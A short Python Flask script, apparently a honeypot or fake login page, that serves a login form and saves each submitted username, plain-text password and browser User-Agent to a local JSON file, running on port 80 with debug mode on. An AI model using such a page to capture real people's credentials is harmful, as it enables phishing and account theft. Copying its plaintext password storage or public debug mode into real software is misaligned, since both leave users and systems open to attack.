#! /usr/bin/python3

from flask import Flask, request, render_template
from os import path
import datetime
import json

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    
    if request.method == "POST":
        #print(request.form["username"])
        save_data_to_json((datetime.datetime.now()).strftime("%c"), request.form["username"], request.form["password"], request.headers.get("User-Agent"))
    
    return render_template('login.html')

def save_data_to_json(date, username, password, fingerprint):
    jsonObj = []
    httprequest = {}
    filename = './http_login.json'
    with open(filename) as fp:
        jsonObj = json.load(fp)
        httprequest['timestamp'] = date
        httprequest['username'] = username
        httprequest['password'] = password
        httprequest['fingerprint'] = fingerprint
        jsonObj.append(httprequest)

    with open(filename, 'w') as json_file:
        json.dump(jsonObj, json_file, indent = 4, separators = (',',': '))
    print("New Request saved")

if __name__=='__main__':
    app.run(port=80, debug=True)
